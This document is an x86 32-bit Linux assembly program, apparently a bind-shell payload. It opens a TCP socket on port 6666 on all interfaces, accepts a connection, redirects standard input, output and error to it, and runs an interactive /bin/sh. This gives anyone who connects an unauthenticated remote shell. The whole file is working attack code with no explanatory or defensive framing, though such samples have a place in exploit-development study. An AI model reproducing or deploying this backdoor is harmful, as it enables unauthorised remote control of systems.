.section .data
    socket_param:
        .long 2
        .long 1
        .long 6

    bind_param:
        .long 0
        .long 0
        .long 16

    listen_param:
        .long 0
        .long 1

    accept_param:
        .long 0
        .long 0
        .long 0

    serv_addr:
        .byte 2, 0
        .byte 0x1a, 0xa
        .byte 0, 0, 0, 0
        .byte 0, 0, 0, 0, 0, 0, 0, 0

    shell_path:
        .asciz "/bin/sh"

    shell_arg:
        .asciz "-i"

.section .text
.global _start

socketcall:
    push %ebp
    mov %esp, %ebp

    push %eax
    push %ebx
    push %ecx

    mov $0x66, %eax
    mov 8(%ebp), %ebx     # num
    mov 12(%ebp), %ecx    # param
    int $0x80

    # save return value in edx temporarily
    mov %eax, %edx

    pop %ecx
    pop %ebx
    pop %eax

    # set return value
    mov %edx, %eax

    mov %ebp, %esp
    pop %ebp
    ret

_start:
    # soc = socketcall(1, socket_param);
    push $socket_param
    push $1
    call socketcall
    add $8, %esp         # stack cleanup
    mov %eax, %edi       # save soc in edi

    # bind_param[0] = soc;
    lea bind_param, %eax
    mov %edi, (%eax)

    # bind_param[1] = (unsigned long)&serv_addr;
    lea serv_addr, %ebx
    mov %ebx, 4(%eax)

    # socketcall(2, bind_param)
    push $bind_param
    push $2
    call socketcall
    add $8, %esp         # stack cleanup

    # listen_param[0] = soc
    lea listen_param, %eax
    mov %edi, (%eax)

    # socketcall(4, listen_param)
    push $listen_param
    push $4
    call socketcall
    add $8, %esp         # stack cleanup

    # accept_param[0] = soc;
    lea accept_param, %eax
    mov %edi, (%eax)

    # soc = socketcall(5, accept_param)
    push $accept_param
    push $5
    call socketcall
    add $8, %esp         # stack cleanup
    mov %eax, %edi

    # dup2(soc, 0)
    mov $63, %eax
    mov %edi, %ebx
    xor %ecx, %ecx
    int $0x80

    # dup2(soc, 1)
    mov $63, %eax
    mov %edi, %ebx
    mov $1, %ecx
    int $0x80

    # dup2(soc, 2)
    mov $63, %eax
    mov %edi, %ebx
    mov $2, %ecx
    int $0x80

    # execve("/bin/sh", ["/bin/sh", "-i", NULL], NULL)
    lea shell_path, %ebx # 1st arg : ebx
    xor %eax, %eax
    push %eax            # push NULL
    lea shell_arg, %eax
    push %eax            # push "-i"
    lea shell_path, %eax
    push %eax            # push "/bin/sh"
    mov %esp, %ecx       # 2nd arg : ecx
    xor %edx, %edx       # 3rd arg : edx
    mov $11, %eax        # Appel système execve
    int $0x80

    # exit(0)
    mov $1, %eax
    xor %ebx, %ebx
    int $0x80
